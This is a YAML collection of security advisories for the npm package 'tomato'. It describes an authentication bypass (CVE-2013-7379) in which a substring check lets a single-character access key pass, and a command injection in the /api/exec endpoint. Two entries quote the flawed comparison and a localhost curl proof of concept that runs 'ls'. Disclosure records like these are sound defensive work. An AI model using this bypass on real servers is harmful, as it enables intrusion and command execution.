---
- id: npmjs:npm:tomato:38
  title: API Admin Auth Weakness
  description: |
    Versions of `tomato` prior to 0.0.6 are affected by a somewhat complex authentication bypass vulnerability in the admin service when only a single access key is configured on the server. The vulnerability allows an attacker to guess the password for the admin service, no matter how complex that password is, in less than 200 requests.


    ## Details
    The tomato API has an admin service that is enabled by setting up an `access_key` in the config options. This `access_key` is intended to protect the API admin from unauthorized access.


    Tomato verifies the `access_key` by checking to see if the server `access_key` incorporates the user provided value at any location. This allows an attacker to provide a single character as an `access_key`, and so long as the server key contains at least one instance of that character it will be considered a valid key.

    ## Proof of Concept
    This is the snippet of code that does the comparison to authorize requests.

    ```
    if (access_key && config.master.api.access_key.indexOf(access_key) !== -1) {
    ```

    For an access_key that is set to anything that includes the letter 'a' the following request would be authorized.

    ```
    $ curl -X POST "http://localhost:8081/api/exec" -H "Content-Type: application/json" -d @test -H "access-key: a"
    {
     "cmd": "ls",
     "path": ".",
     "stdout": "app.js\nconfig.js\nlog\nnode_modules\nserver.js\n",
     "stderr": ""
    }
    ```
  affected_package: tomato
  vulnerable_versions:
  - "<= 0.0.5"
  severity: high
  package_manager: npm
  cve:
  - CVE-2013-7379
  cwe: CWE-287
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Adam Baldwin
- id: npmjs:npm:tomato:797
  title: Command Injection
  description: All versions of `tomato` are vulnerable to Command Injection. The /api/exec
    endpoint does not validate user input allowing attackers to run arbitrary commands
    in the system.
  affected_package: tomato
  vulnerable_versions:
  - ">=0"
  severity: high
  package_manager: npm
  cwe: CWE-78
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Microsoft Vulnerability Research
- id: ossindex:npm:tomato:359652
  title: "[CVE-2013-7379]  Improper Authentication"
  description: The admin API in the tomato module before 0.0.6 for Node.js does not
    properly check the access key when it is set to a string, which allows remote
    attackers to bypass authentication via a string in the access-key header that
    partially matches config.master.api.access_key.
  affected_package: tomato
  vulnerable_versions:
  - "<=0.0.5"
  package_manager: npm
  cve:
  - CVE-2013-7379
  disclosed_date: 2014-05-16
  created_date: 2014-05-16
  last_modified_date: 2017-07-30
  credit:
  - OSSIndex
  references:
  - http://www.openwall.com/lists/oss-security/2014/05/13/1
  - http://www.openwall.com/lists/oss-security/2014/05/15/2
  - https://github.com/leizongmin/tomato/commit/9e427d524e04a905312a3294c85e939ed7d57b8c
  - https://nodesecurity.io/advisories/Tomato_API_Admin_Auth_Weakness
  source_url: https://ossindex.net/resource/package/7014548951/vulnerabilities
- id: snykio:npm:tomato:20130307
  title: API Admin Auth Weakness
  description: |+
    Tomato is a Node.js web framework.

    The tomato API has an admin service that is enabled by setting up an
    access\_key in the config options. This access\_key is intended to
    protect the API admin from unauthorized access.

    The key is checked by checking to see if the access\_key provided in the
    request is within the configured access\_key string, not equal to. So a
    single character that\'s within the access key is sufficient to bypass
    this control.

    *Source: [Node Security Project][1]*



    [1]: https://nodesecurity.io/advisories/38
    \n**Example:**

    This is the snippet of code that does the comparison to authorize
    requests.

        if (access_key && config.master.api.access_key.indexOf(access_key) !== -1) {

    For an access\_key that is set to anything that includes the letter
    \'a\' the following request would be authorized.

        $ curl -X POST "http://localhost:8081/api/exec" -H "Content-Type: application/json" -d @test -H "access-key: a"
        {
         "cmd": "ls",
         "path": ".",
         "stdout": "app.js\nconfig.js\nlog\nnode_modules\nserver.js\n",
         "stderr": ""
        }

    **Mitigating factors:**

    The admin interface is disabled by default. The module author confirmed
    that the access\_key should really be an array of access\_keys, however
    based on variable name and documentation it was not clear that it should
    be an array. The vulnerability exists only if a string access\_key is
    set.

    Module version 0.0.6 has been updated to ensure an array of keys is
    provided as well as documentation updates.

  affected_package: tomato
  vulnerable_versions:
  - "<0.0.6"
  severity: medium
  package_manager: npm
  cve:
  - CVE-2013-7379
  cwe:
  - CWE-305
  disclosed_date: 2013-03-07
  created_date: 2013-03-07
  last_modified_date: 2013-03-07
  credit:
  - Adam Baldwin
  source_url: https://snyk.io/vuln/npm:tomato:20130307
- id: snykio:npm:tomato:455283
  title: Arbitrary Code Injection
  description: |
    [tomato][1] is a Web framework based on Node.js.

    Affected versions of this package are vulnerable to Arbitrary Code
    Injection via the `/api/exec` endpoint. It does not validate user input
    allowing attackers to run arbitrary commands in the system.



    [1]: https://www.npmjs.com/package/tomato
  affected_package: tomato
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cwe:
  - CWE-94
  disclosed_date: 2019-04-03
  created_date: 2019-07-24
  last_modified_date: 2019-07-24
  credit:
  - Microsoft Vulnerability Research
  references:
  - https://www.npmjs.com/advisories/797
  source_url: https://snyk.io/vuln/SNYK-JS-TOMATO-455283
